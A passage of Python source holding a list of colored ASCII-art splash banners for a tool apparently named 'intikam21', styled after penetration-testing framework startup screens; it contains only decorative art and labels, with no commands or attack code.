⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠖⠊⠉⠉⠉⠑⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⡪⡻⣣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢢⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡽⠀⠹⣴⣄⡀⠀⣄⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠙⢝⢽⢻⣿⣟⡀⠀⠀⠀⡄⡸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡜⣉⠀⠀⠈⡤⠅⠫⣿⠙⠀⠀⠀⣉⢳⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣳⢻⡚⠶⣤⡀⠸⡶⠟⢀⣠⠴⢛⡿⡜⠀⠀⠀⠀⠀⠀⠀
⣄⠀⠀⠀⠀⠀⡜⢹⣌⢷⠤⠤⠽⡳⠷⢞⠯⠄⠤⡾⣁⠇⢀⠀⠀⠀⠀⢠
 ⢸⢦⡀⠀⠀⠸⡵⣹⠉⣳⠨⡀⠀⠀⠀⠀⠈⢈⠥⡾⠗⡉⢩⠛⠉⡏  
⠀⢧⠙⢦⡀⠀⠙⢷⢞⣒⡇  intikam21 ⢰⠁⠦⢍⡩⠃⠀⢀⡠⠊⠁
⠀⠀⠳⣐⢌⠲⢄⡈⠳⣀⣱⣄⠀ninja⠀⠀⣀⠜⣉⣑⠭⢀⡠⠔⡉⢀⠔
⠀⠀⠀⠈⠓⢤⡂⢈⠓⠤⣉⡙⠳⠤⠀⠤⠞⠓⠉⣁⠤⠒⡉⢄⡨⠖⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠑⠪⢴⣠⠍⡓⠢⣄⡠⠔⢒⠉⣄⡢⠕⠊⠁⠀⠀⠀⠀⠀⠀⡠⠤⠀⡀⡀⡀⠀⠠⠂⢱⠔⣛⠋⢭⣐⣦⡽⠒⣛⠣⡎⠁⡦⠀⡀⣀⢀
⠠⢤      {Fore.RESET}  [{Fore.BLUE}int{Fore.RESET}]  [{Fore.RED}intninja{Fore.RESET}] [{Fore.BLUE}intmeterpreter{Fore.RESET}]
{Fore.RED}⠧⠠⠄⠇⠧⠬⠼⠴⣇⣂⠖⠒⠉⠁⠀⠀⠈⠉⠒⠲⣡⣰⠥⠤⠦⠀⠄⢠⠀⠸
{Fore.RESET}
""",
    """
    {Fore.RESET}   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀ ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⡎⠉⠀ ⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠉⠀⠀⠀⠀ ⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣿⠛⠶⠤⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣥⣈⠉⠒⠦⣄⠀⣀⠀⠀ ⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠛⠓⠲⣄⠈⠳⡌⠳⡀ ⠀⠀⠀⢸⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⠀⠈⠳⡀⠈⢦⡹ ⡀⠀⠀⢸⠃⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠟⢳⣤⠀⢻⡿⣆⠀⢳ ⡗⠀⠀⡼⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣤⡟⠀⠀⠈⠛⣆⠀ ⢷⠀⠀⡇⠀⠨⢧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣧⣠⠀⠀⠀⠘⣆ ⠈⠃⣰⠁⠀⠄⠸⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣷⡄⠀⠀⠀⠸ ⡅⢀⡏⠀⠀⠀⢠⠏⠱⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣷⣤⣠⠖⢻ ⠁⡼⠀⠀⢀⡴⠋⠀⠀⠈⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠉⢻⡻⣿⣿⣿⢧⣠⢏ ⣾⣡⠤⠚⣏⠀⠀⠀⠀⠀⠀⠉⠣⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⡿⠁⢠⢿⣿⢿⣿⡿⠋⣿⡏ ⠉⠀⠀⠀⣹⡞⠁⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣆⡴⡟⢸⢸⢰⡄⠀⠀⣹⢱ ⠀⠀⠀⢰⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠃⣿⠀⠃⢸⢸⠘⡇⠀⠀⣿⢸ ⠀⠀⠀⠃⠀⢧⡄⢀⡴⠃⠀⠀⠀⠀⠘
⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⡧⣿⠀⠀⡸⣾⠀⡇⠀⠀⣯⡏ ⠀⠀⠀⠀⠀⣸⡷⣫⣴⠀⠀⠀⢀⠂⢀
⠘⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⠀⠀⣿⠀⠀⡇⣿⠰⠇⠀⣸⢻⠇ ⠀⠀⠀⠀⢰⠿⠞⣫⢞⡠⠀⢀⠂⠀⢸
⠀⠘⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣏⠻⣦⣤⣿⠀⠀⢧⡇⠀⠀⠀⢹⣾⠀ ⠀⠀⠀⢠⡏⣠⣼⣋⣉⣀⣴⣁⣀⣀⡎
⠀⠀⠈⢿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⡌⠙⠺⢭⡿⠀⠀⠸⠆⠀⠀⠀⢸⣿⡀ ⠀⠀⠀⡟⢀⡧⣄⣠⣠⣤⣤⣤⣀⣈⡇
⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠃⠀⠈⠢⠐⢤⣧⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀ ⠀⠀⣼⠁⡼⠉⠛⠒⠒⠒⠒⠶⠶⢿⠁
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⣤⣛⡛⠛⢢⠀⠀⢠⠈⢪⣻⡇⠀⠀⠀⠀⠀⠀⠐⠃⠀ ⠀⢰⠏⢸⡧⠤⠤⠤⢤⣀⣀⡀⠀⡾⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣀⣀⠤⠴⠒⠚⣩⠽⣿⠖⠋⠉⠀⠀⣦⠈⣧⠀⠈⣳⣼⡿⠛⠀⠀⠀⠀⠀⠀⠀⢀⡤ ⠴⠞⠀⣿⠓⠢⠤⠤⠤⠤⣌⣉⣻⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣭⣶⣦⣤⣶⠋⢡⣴⠇⢀⣴⡦⠀⣠⢿⣤⣿⡴⠒⢹⣏⣀⠀⠀⢀⣀⣀⠀⠀⢀ ⣠⣄ ⢀⣤⣾⡯⡀⠀⠉⠒⠒⠤⢤⣭⣽⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣻⠃⡴⠛⢁⣴⡯⠇⠀⠀⠈⠉⠉⠉⢹⡍⠉⠉⠙⣷⠈⢻⠉ ⠻⠀⠘ ⣟⠻⠀⡉⠁⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣮⣵⢰⣧⣞⣶⡿⢋⣡⠔⠚⣀⡀⠀⠀⠀⠀⢨⠇⠀⠀⠀⢹⠀⠈⠁⠀⠀⠀ ⠿⠀⠀⠈⠓⠶⠄⠀⠐⣲⡾⠋⡿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⢎⢠⠟⡠⣾⠟⢋⡠⠤⠤⢤⠤⠾⠤⠤⣤⢤⡼⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣀⡴⠞⠁⢀⣴⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡙⠻⣿⣿⣿⣿⣝⡋⣮⣴⣞⣥⡄⠀⠀⢀⣀⡤⠴⠚⠛⠪⣟⡧⢤⣄⣠⣄⡐ ⠦⣤⣤⣤⠴⠚⠉⠀⠀⠀⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡄⠈⠙⢿⣿⣿⣿⣿⠟⠋⣁⣤⠴⠚⠉⠁⠀⠀⠀⠀⠀⠀⠉⠲⢤⡀⠉⠉ ⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡄⠀⠀⢙⣹⣷⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦ ⣄⠀⠀⠀⠀⠀⠀⠀⠰⢚⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠙⠂⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RESET}⠀⠀⠀⠀""",
    """
    {Fore.RED}
    ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀
⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀ ⠀⣀⣀⡠⠤⠔⠒⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠒⠒⠠ ⠤⠤⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠒⠒⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢠⠒⠒⠤⠄⠲⠵⢦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⢒⣉⢀⣀⡀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠁⠙⠒⢤⣄⡀⠠⣀⠀⠀⠒⠂⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠠⠤⢀⣀⡀⠀⠈⠉⠉⠐⠒⠤ ⢄⣀⠀⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠫⡢⣀⠉⠒⢄⡀⠀⠀⠀⠉⠑⠂⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠢⠤⣀⡀⠀ ⠀⠀⠉⠒⠢⢄⡀⠈⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢵⠶⢊⡍⢉⠉⠉⠉⠉⠉⠈⠪⡑⠦⡀⠈⠑⠄⠀⠀⠀⠀⠀⠀⠈⠉⠒⠠⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑ ⠒⠤⢀⡀⠀⡠⠌⠉⠒⠬⣦⣀⠀
⠀⠀⠀⠀⠀⠈⢁⠴⢟⠿⣲⢿⣅⢒⠠⢄⡀⠀⠀⠈⠢⡈⠑⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠠⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢨⠏⠛⠧⣄⠀⠀⠀⠀⠉
⠀⠀⠀⠀⠀⣠⠋⢀⠈⠀⠉⠀⠹⡎⠳⡀⠘⠠⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀ ⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡼⢛⠞⠫⣀⢀⡀⠀⠀⣿⠀⠘⣦⠀⠀⡀⠀⠀⡇⠀⠀⡴⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠣⠄⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠰⠿⢃⣀⣤⡞⢁⣼⠷⠀⠀⡇⠀⠀⡇⠀⢰⠃⠀⢠⠁⠀⡰⠁⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠔⠒⠒⠂⠀⠀⠀⠀⠉⠉⠉ ⠲⢦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠳⣾⡿⣫⠞⡝⠀⢠⠄⢸⠃⠀⠀⡻⠀⠊⠀⢀⠎⠀⡰⠁⢰⠃⠀⠀⠀⠀⢀⡠⠔⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠉⠻⠦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠑⠴⠁⡸⠁⠀⡜⢀⡟⠀⠀⠀⡇⠀⠀⡠⡋⠀⠰⢁⡠⡮⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠃⠀⢰⠁⣼⠁⠀⠀⢰⠁⢀⡮⣊⠤⠒⠛⠓⠲⠀⠀⠀⠛⠻⢧⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣄⣀⡀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠎⠀⠀⡇⠀⡧⠀⠀⠀⡧⣶⠕⠫⠴⠒⠦⠀⠀⠒⠀⠀⠀⡠⠄⠀⠠⢭⡲⢤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢝⠢⣄ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠱⣦⣤⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⠀⠀⠀⠱⡀⠙⠚⢧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡈ ⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢱⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠑⢧⣀⠀⠀⠀⠀⠀⠀⠀⠀⢱ ⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣆⠀⠀⠈⢆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⢣⠀⠀⠀⠀⠀⢀⠣⣀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠉⠢⢄⠀⠀⠀⠀⢸⠀⠀⠀⢠⠖⠉⡌⠁⠘⡏⡽⠚⠥⣲⡸⠀⠀⠉⠢⠀⠀⠀⠀⠈⠫⢄⣀⡀⠀⠀⡰ ⠁⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠉⢇⠀⠀⢰⠁⣀⠴⡏⠀⠀⠈⠢⡀⠘⢧⡀⠀⠈⠈⢳⡦⣀⠀⠀⠀⢄⡀⠀⠀⠀⠉⠁⠘⠊⠁ ⠀⣠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⠤⢠⡬⠖⠁⣸⡋⢣⡄⠈⠓⠤⣀⣤⠒⡄⠀⠉⠒⠤⣀⣀⠑⢄⠉⠲⢄⡀⠈⠓⠤⠀⠀⠀⠀⠄ ⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠋⠀⢤⡦⠚⢡⠎⠀⢀⡠⠔⠁⢀⡠⠃⠀⠀⠀⢀⠆⠀⢠⠃⠀⠀⠀⠈⠓⠦⠤⢀⣀⣀⡀⠤⠚ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣤⡶⣶⠋⠁⡠⣶⢶⣝⠏⢀⠔⣡⢶⢲⠟⢖⣠⠒⠁⠀⠀⢀⣀⣤⣊⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⠹⠊⠉⠉⠘⠉⠻⠒⠒⠁⠀⠓⠓⠛⠃⠀⠁⠀⠀⠀⠀⠛⠗⠓⠿⠖⠋⠁

___ _   _ _____ ___ _  __    _    __  __ ____ 
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) 
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|
⠀⠀⠀{Fore.RESET}⠀""",
   """
   {Fore.BLUE}
                                                ___
    |\    ___   |\/|   /\      |            /___)   /\     ^      ___   |   |
    | >  /___   |  |  <  >  |\ |           /  \    <  >   /_\    /      |___|
    |/  /_____  |  |   \/   | \|         //    \\   \/   /   \  (_____  |   |
                |                                \                      |    

                   İ   N   T   İ   K   A   M   2   1 


                                      cDc
                                     _   _
                                    ((___))
                                    [ x x ]
                          cDc        \   /        cDc
                                     (' ')
                                      (U)




                               İ N T İ K A M 2 1
                          -int-   BASE SYSTEM   -int-
                          ---------------------------

                                HAVE A NICE DAY
----------------------- ------------ --------- -------- ------ ---- -- - - - 
    {Fore.RESET}""",
    """
    {Fore.BLUE}
       +-------------------------------------------------+
        |               _                                 |
        |              /  \                               |
        |             /|oo \        İ N T İ K A M 2 1|
        |            (_|  /_)                             |
        |             _`@/_ \    _    F R A M E W O R K |
        |            |     | \   \\                       |
        |            | (*) |  \   ))    Boston, MA, USA   |
        |   ______   |__U__| /  \//                       |
        |  / SUDO \   _//|| _\   /   İntoNet 1:666/1777   |
        | (________) (_/(_|(____/                         |
        |                  (rm)                           |
        +-------------------------------------------------+
   {Fore.RESET} """, 
    """{Fore.RED}
                                                                                                        
   @@                               @@@#+::-=+#@    +=@@@@           :**-                               
                                        @@@@@@        @@         =@-  +  @%@%                           
   @@.   @@@      @@  @@@@@@@@@@@%  @@  @@@@@@       #@         % :=@%%%%@*= **                         
   @@.   @@@@     @@      -@@       @@  @@@@@@      *@        :..@# -@@@@* =% *#                        
   @@.   @@ %@.   @@      -@@       @@  @@@@@@     %@         - -%  %+ *%@+ =%.+:                       
   i@@.   @@  =@*  @@      -@@       @@  @@@@@@    @@          =:%= @@@*###@  %#@#                       
   @@.   @@   =@@ @@      -@@       @@  @@@@@@   @@           ####  @@@@@@- +###                        
   @@.   @@    +@@@@      -@@       @@  @@@@@@  @@@@#          - =#%@@@@@@@%# =+                        
   @@    @@      @@@      :@@       @@ @@@@@@@@@+   #@@@        #  .=+**+-   #:                         
                                        %@@@@@@      @@@@         =+     :-*                            
                                        #@@@@@       @@@@-                                              
                                        *@@@@@       @@@@@    @@@      -@@@     -@@@   @@@%@@@    #@@@  
                                        +@@@@@       @@@@@   @# %@     -@@@@    @ @@        %@+     #@  
                                        -@@@@@       @@@@@  @@   @@    -@- @.  #@ @@       -@@      #@  
                                        @@@@@@@      @@@@@ *@@   @@=   -@: +@  @  @@     *@@        #@  
                                                     #@@@@@@@.    @@   -@:  @@@:  @@   +@#          #@  
                                                      @@@@@@       @@  -@:  :@@   @@  +@@@@@@@-  :*#@@@ 
                                                        @@@@                                            
                                                                                                                                                                                         {Fore.RESET}        """, 
        """ {Fore.RED}
                            ..,;:ccc,.                             
                          ......''';lxO.                           
                ...............,:ld;                           
                           .';;;:::;,,.x,                          
                      ..'''.            0Xxoc:,.  ...               
                  ....                ,ONkc;,;cokOdc',.            
                 .                   OMo           ':ddo.          
                                    dMc               :OO;          
                                    0M.                 .:o.       
                                    ;Wd                            
                                     ;XO,                         \033[93mCreated By @intikam21 \033[34m                         
                                       ,d0Odlc;,..                 
                                           ..',;:cdOOd::,.        
                                                    .:d;.':;.     
                                                       'd,  .'     
                                                         ;l   ..    
                                                          .o       
                                                            c
                                                            .'                      
                 ▐ ▄                ▄▄▄▄▄        
   ██         •█▌▐█            •██          
   ▐█·        ▐█▐▐▌           ▐█.▪        
   ▐█▌        ██▐█▌         ▐█▌·        
   ▀▀▀        ▀▀ █▪            ▀▀▀  {Fore.RESET}""",
   """
                             ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 {Fore.RED}###{Fore.RESET}      {Fore.RED}###{Fore.RESET}       ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://intikam21.com
   """,
   """
+-------------------------------------------------------+
|  {Fore.RED}İNTİKAM21 by Replit {Fore.RESET}                                 |
+---------------------------+---------------------------+
|     {Fore.BLUE} __________________ {Fore.RESET}  |                           |
| {Fore.BLUE} ==c(______(o(______(_()  | |""""""""""""|======[***  |{Fore.RESET}
|   {Fore.BLUE}          )=\\  {Fore.RESET}  {Fore.GREEN}       | |  EXPLOIT   \\            |
